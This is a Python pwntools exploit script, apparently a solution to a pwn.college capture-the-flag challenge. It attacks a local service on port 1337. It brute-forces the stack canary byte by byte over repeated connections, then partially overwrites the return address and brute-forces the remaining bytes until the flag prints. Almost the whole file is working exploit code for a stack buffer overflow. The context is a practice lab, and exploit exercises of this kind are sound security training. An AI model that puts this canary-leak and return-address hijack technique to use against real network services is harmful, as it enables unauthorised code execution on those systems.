import pwn


pwn.context.arch = "amd64"
pwn.context.os = "linux"
pwn.context.log_level = "warn"


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


canary = bytearray()
buffer_addr = 0x40
canary_addr = 0x58
while len(canary) < 8:
    payload = bytearray(pwn.cyclic(canary_addr - buffer_addr))
    payload += canary
    with pwn.log.progress(f"Trying #{len(canary)} byte", level=30) as byte_p:
        for byte in range(256):

            def crack_canary():
                with pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE) as io:
                    to_send = payload[:]
                    to_send.append(byte)
                    io.sendlineafter(b"Payload size:", str(len(to_send)).encode())
                    io.sendlineafter(b"Send your payload", to_send)
                    io.sendline()
                    io.sendline()
                    io.sendline()
                    out = io.recvrepeat()
                    if b"### Goodbye!" in out:
                        canary.append(byte)
                        return True
                    return False

            byte_p.status(f"{byte:#04x}")
            byte_s = False
            while True:
                try:
                    byte_s = crack_canary()
                    break
                except EOFError:
                    continue
            if not byte_s:
                continue
            byte_p.success(f"Confirmed byte: {byte:#04x}")
            break
pwn.warn(f"Leaked canary: {canary.hex()}")

for last in range(256):
    for byte in range(0x00, 0x100, 0x10):
        payload = bytearray(pwn.cyclic(canary_addr - buffer_addr))
        payload += canary
        payload += b"." * 8
        payload += b"\xa0"
        payload += bytes([0xC + byte])
        payload += bytes([last])
        print(payload[-3:].hex())

        def crack_flag():
            with pwn.process(["nc", "127.0.0.1", "1337"], stdout=pwn.PIPE) as io:
                io.sendlineafter(b"Payload size:", str(len(payload)).encode())
                io.sendlineafter(b"Send your payload", payload)
                io.sendline()
                out = io.recvrepeat()
                if b"pwn.college{" in out:
                    print(out.decode())
                    exit()

        while True:
            try:
                byte_s = crack_flag()
                break
            except EOFError:
                continue
